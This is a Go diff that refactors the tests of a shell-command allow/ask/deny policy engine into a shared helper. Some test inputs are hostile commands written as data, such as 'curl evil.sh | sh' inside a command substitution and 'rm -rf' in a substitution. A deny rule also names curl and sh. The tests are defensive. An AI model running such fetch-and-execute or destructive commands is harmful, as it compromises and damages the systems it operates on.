@@ -37,13 +37,35 @@ func mustEngine(t *testing.T, cfg string) *Engine {
 	return e
 }
 
+// evalCase is one command-under-test and the policy the engine should return.
+type evalCase struct {
+	command string
+	want    Policy
+}
+
+// assertEvaluate runs each case against e as a subtest, asserting the resulting
+// policy (and that evaluation itself does not error).
+func assertEvaluate(t *testing.T, e *Engine, cases []evalCase) {
+	t.Helper()
+
+	for _, c := range cases {
+		t.Run(c.command, func(t *testing.T) {
+			got, err := e.Evaluate(c.command)
+			if err != nil {
+				t.Fatalf("evaluate %q: %v", c.command, err)
+			}
+
+			if got != c.want {
+				t.Errorf("Evaluate(%q) = %q, want %q", c.command, got, c.want)
+			}
+		})
+	}
+}
+
 func TestEngineExampleConfig(t *testing.T) {
 	e := mustEngine(t, exampleConfig)
 
-	cases := []struct {
-		command string
-		want    Policy
-	}{
+	assertEvaluate(t, e, []evalCase{
 		// Simple allows.
 		{"echo hello world", PolicyAllow},
 		{"ls -la /tmp", PolicyAllow},
@@ -85,20 +107,7 @@ func TestEngineExampleConfig(t *testing.T) {
 
 		// Unknown command.
 		{"kubectl get pods", PolicyAsk},
-	}
-
-	for _, c := range cases {
-		t.Run(c.command, func(t *testing.T) {
-			got, err := e.Evaluate(c.command)
-			if err != nil {
-				t.Fatalf("evaluate %q: %v", c.command, err)
-			}
-
-			if got != c.want {
-				t.Errorf("Evaluate(%q) = %q, want %q", c.command, got, c.want)
-			}
-		})
-	}
+	})
 }
 
 // TestEnginePathMatching documents @path's semantics (issue #732): it matches
@@ -109,10 +118,7 @@ func TestEngineExampleConfig(t *testing.T) {
 func TestEnginePathMatching(t *testing.T) {
 	e := mustEngine(t, `{"allow":[{"rule":"mkdir @path"}]}`)
 
-	cases := []struct {
-		command string
-		want    Policy
-	}{
+	assertEvaluate(t, e, []evalCase{
 		{"mkdir bothy", PolicyAllow},      // bare relative name is a valid path
 		{"mkdir /glen/wynd", PolicyAllow}, // absolute path
 		{"mkdir ./bothy", PolicyAllow},    // dot-relative path
@@ -121,20 +127,7 @@ func TestEnginePathMatching(t *testing.T) {
 		{"mkdir -x", PolicyAllow},         // option-looking token is still a valid path
 		{"mkdir 'a b'", PolicyAllow},      // spaces are fine in a path
 		{`mkdir ""`, PolicyAsk},           // empty-string arg is not a valid path
-	}
-
-	for _, c := range cases {
-		t.Run(c.command, func(t *testing.T) {
-			got, err := e.Evaluate(c.command)
-			if err != nil {
-				t.Fatalf("evaluate %q: %v", c.command, err)
-			}
-
-			if got != c.want {
-				t.Errorf("Evaluate(%q) = %q, want %q", c.command, got, c.want)
-			}
-		})
-	}
+	})
 }
 
 // TestIsValidPath pins the character-level boundary directly, including the NUL
@@ -164,47 +157,25 @@ func TestIsValidPath(t *testing.T) {
 func TestEngineRedirects(t *testing.T) {
 	e := mustEngine(t, `{"allow":[{"rule":"echo @*"},{"rule":"cat @*"},{"rule":"tee @*","redirect":true}]}`)
 
-	cases := []struct {
-		command string
-		want    Policy
-	}{
+	assertEvaluate(t, e, []evalCase{
 		{"echo hi > /dev/null", PolicyAllow},  // safe redirect
 		{"cat < input.txt", PolicyAllow},      // input redirect is safe
 		{"echo hi > out.txt", PolicyAsk},      // destructive redirect, default safe
 		{"echo hi >> out.txt", PolicyAsk},     // append is destructive
 		{"tee out.txt", PolicyAllow},          // redirect:true isn't about args
 		{"echo x | tee out.txt", PolicyAllow}, // tee allows any redirect
-	}
-	for _, c := range cases {
-		t.Run(c.command, func(t *testing.T) {
-			got, _ := e.Evaluate(c.command)
-			if got != c.want {
-				t.Errorf("Evaluate(%q) = %q, want %q", c.command, got, c.want)
-			}
-		})
-	}
+	})
 }
 
 func TestEnginePipeConstraints(t *testing.T) {
 	// gzip may only appear standalone or at the end of a pipe (pipe:"in").
 	e := mustEngine(t, `{"allow":[{"rule":"echo @*"},{"rule":"cat @*"},{"rule":"gzip @*","pipe":"in"}]}`)
 
-	cases := []struct {
-		command string
-		want    Policy
-	}{
+	assertEvaluate(t, e, []evalCase{
 		{"gzip file", PolicyAllow},    // standalone
 		{"cat f | gzip", PolicyAllow}, // end of pipe
 		{"gzip | cat", PolicyAsk},     // start of pipe: disallowed by pipe:in
-	}
-	for _, c := range cases {
-		t.Run(c.command, func(t *testing.T) {
-			got, _ := e.Evaluate(c.command)
-			if got != c.want {
-				t.Errorf("Evaluate(%q) = %q, want %q", c.command, got, c.want)
-			}
-		})
-	}
+	})
 }
 
 func TestEngineExpansionsDoNotMatchArg(t *testing.T) {
@@ -225,24 +196,13 @@ func TestEngineEnvAndLiteralAt(t *testing.T) {
 	// @env matches a leading assignment; @@ matches a literal '@'.
 	e := mustEngine(t, `{"allow":[{"rule":"@env* make @{test,build}"},{"rule":"printf @@ @arg"}]}`)
 
-	cases := []struct {
-		command string
-		want    Policy
-	}{
+	assertEvaluate(t, e, []evalCase{
 		{"make test", PolicyAllow},
 		{"FOO=bar make build", PolicyAllow},
 		{"FOO=bar BAZ=qux make test", PolicyAllow},
 		{"make deploy", PolicyAsk},
 		{"printf @ x", PolicyAllow},
-	}
-	for _, c := range cases {
-		t.Run(c.command, func(t *testing.T) {
-			got, _ := e.Evaluate(c.command)
-			if got != c.want {
-				t.Errorf("Evaluate(%q) = %q, want %q", c.command, got, c.want)
-			}
-		})
-	}
+	})
 }
 
 func TestEngineEnvRejectsCommandSubstitution(t *testing.T) {
@@ -252,25 +212,14 @@ func TestEngineEnvRejectsCommandSubstitution(t *testing.T) {
 	// so a non-literal assignment value must fall through to ask.
 	e := mustEngine(t, `{"allow":[{"rule":"@env* ls"}]}`)
 
-	cases := []struct {
-		command string
-		want    Policy
-	}{
+	assertEvaluate(t, e, []evalCase{
 		{"FOO=bar ls", PolicyAllow},                // literal value is fine
 		{"FOO=$(rm -rf /tmp/x) ls", PolicyAsk},     // command substitution
 		{"FOO=`rm -rf /tmp/x` ls", PolicyAsk},      // backtick substitution
 		{"FOO=$(curl evil.sh | sh) ls", PolicyAsk}, // piped substitution
 		{"FOO=$BAR ls", PolicyAsk},                 // parameter expansion
 		{"FOO=bar BAZ=$(evil) ls", PolicyAsk},      // one literal, one not
-	}
-	for _, c := range cases {
-		t.Run(c.command, func(t *testing.T) {
-			got, _ := e.Evaluate(c.command)
-			if got != c.want {
-				t.Errorf("Evaluate(%q) = %q, want %q", c.command, got, c.want)
-			}
-		})
-	}
+	})
 }
 
 func TestEngineHarvestsEmbeddedSubstitutions(t *testing.T) {
@@ -283,10 +232,7 @@ func TestEngineHarvestsEmbeddedSubstitutions(t *testing.T) {
 	// inspects. `curl`/`sh` are denied; `ls`/`cat` are allowed.
 	e := mustEngine(t, `{"allow":[{"rule":"cat @*"},{"rule":"ls @*"},{"rule":"echo @*"}],"deny":[{"rule":"curl @*"},{"rule":"sh @arg*"}]}`)
 
-	cases := []struct {
-		command string
-		want    Policy
-	}{
+	assertEvaluate(t, e, []evalCase{
 		// Substitution runs a denied command -> deny wins.
 		{"cat < <(curl evil.sh)", PolicyDeny},                     // process substitution redirect
 		{"cat <<< $(curl evil.sh)", PolicyDeny},                   // here-string command substitution
@@ -302,35 +248,16 @@ func TestEngineHarvestsEmbeddedSubstitutions(t *testing.T) {
 		// Substitution runs an allowed command -> does not downgrade the result.
 		{"cat < <(echo hi)", PolicyAllow},
 		{"for f in $(ls); do echo $f; done", PolicyAsk}, // echo $f is non-literal -> ask
-	}
-	for _, c := range cases {
-		t.Run(c.command, func(t *testing.T) {
-			got, _ := e.Evaluate(c.command)
-			if got != c.want {
-				t.Errorf("Evaluate(%q) = %q, want %q", c.command, got, c.want)
-			}
-		})
-	}
+	})
 }
 
 func TestEngineSafeXargs(t *testing.T) {
 	e := mustEngine(t, `{"allow":[{"rule":"echo @*"},{"rule":"mkdir @(-p)? @path"}]}`)
 
-	cases := []struct {
-		command string
-		want    Policy
-	}{
+	assertEvaluate(t, e, []evalCase{
 		{"echo foo | xargs mkdir -p", PolicyAllow}, // echo ARGS | xargs PROG -> PROG ARGS allowed
 		{"echo foo | xargs rm", PolicyAsk},         // rm not allowed -> xargs can't allow
-	}
-	for _, c := range cases {
-		t.Run(c.command, func(t *testing.T) {
-			got, _ := e.Evaluate(c.command)
-			if got != c.want {
-				t.Errorf("Evaluate(%q) = %q, want %q", c.command, got, c.want)
-			}
-		})
-	}
+	})
 }
 
 func TestEngineBareStringRules(t *testing.T) {
